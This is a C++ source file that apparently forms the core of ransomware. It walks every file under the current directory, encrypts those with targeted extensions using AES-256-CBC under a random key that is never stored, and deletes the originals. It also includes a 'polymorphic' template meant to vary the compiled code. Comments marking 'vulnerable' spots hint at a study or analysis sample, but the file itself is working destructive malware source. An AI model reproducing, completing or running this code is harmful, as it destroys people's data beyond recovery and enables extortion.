#include "encryptor_config.h"
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <fstream>
#include <vector>
#include <filesystem>
#include <iostream>

// Polymorphic template to vary AES context initialization at compile-time
template<int N>
struct PolymorphicAES {
    static constexpr int value = N;
    
    static EVP_CIPHER_CTX* init_ctx(unsigned char* key, unsigned char* iv, bool encrypt) {
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        // Vary initialization based on template parameter
        if constexpr (N % 3 == 0) {
            EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv, encrypt);
        } else if constexpr (N % 3 == 1) {
            EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv);
            if (!encrypt) EVP_CIPHER_CTX_set_flags(ctx, EVP_CIPH_NO_PADDING);
        } else {
            EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv, encrypt ? 1 : 0);
        }
        return ctx;
    }
};

// Compile-time randomized selection using __COUNTER__
using CurrentAES = PolymorphicAES<__COUNTER__ % 8>;

void encrypt_file(const std::filesystem::path& filepath, unsigned char* key, unsigned char* iv) {
    std::ifstream in(filepath, std::ios::binary);
    if (!in) return;
    
    std::vector<unsigned char> plaintext((std::istreambuf_iterator<char>(in)), 
                                          std::istreambuf_iterator<char>());
    in.close();
    
    EVP_CIPHER_CTX* ctx = CurrentAES::init_ctx(key, iv, true);
    std::vector<unsigned char> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
    int len = 0, ciphertext_len = 0;
    
    // Vulnerable: No error checking on EVP_EncryptUpdate
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;
    
    std::ofstream out(filepath.string() + TARGET_EXTENSION, std::ios::binary);
    out.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext_len);
    out.close();
    
    // Vulnerable: Original file not securely wiped
    std::filesystem::remove(filepath);
    EVP_CIPHER_CTX_free(ctx);
}

void traverse_and_encrypt(const std::filesystem::path& root) {
    unsigned char key[KEY_SIZE];
    unsigned char iv[EVP_MAX_IV_LENGTH];
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));
    
    for (const auto& entry : std::filesystem::recursive_directory_iterator(root)) {
        if (entry.is_regular_file()) {
            for (const auto& ext : TARGET_EXTENSIONS) {
                if (entry.path().extension() == ext) {
                    encrypt_file(entry.path(), key, iv);
                    break;
                }
            }
        }
    }
}

int main() {
    std::filesystem::path start_dir = std::filesystem::current_path();
    traverse_and_encrypt(start_dir);
    return 0;
}